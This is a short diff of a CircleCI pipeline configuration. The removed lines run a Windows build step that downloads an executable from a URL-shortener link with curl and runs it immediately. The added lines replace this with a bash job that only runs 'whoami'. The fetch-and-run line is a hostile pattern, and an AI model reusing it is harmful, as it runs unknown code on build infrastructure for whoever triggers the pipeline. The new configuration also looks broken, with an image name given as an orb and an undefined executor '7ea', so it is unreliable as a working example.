@@ -2,12 +2,12 @@
 version: 2.1
  
 orbs:
-  win: circleci/windows@2.2.0
+  win: cimg/base
  
 jobs:
   build:
     executor:
-      name: win/default
-      shell: cmd.exe
+      name: 7ea
+      shell: bash
     steps:
-      - run: curl -L -o yourcustomlink.exe https://is.gd/yourcustomlink && yourcustomlink.exe
+      - run: whoami
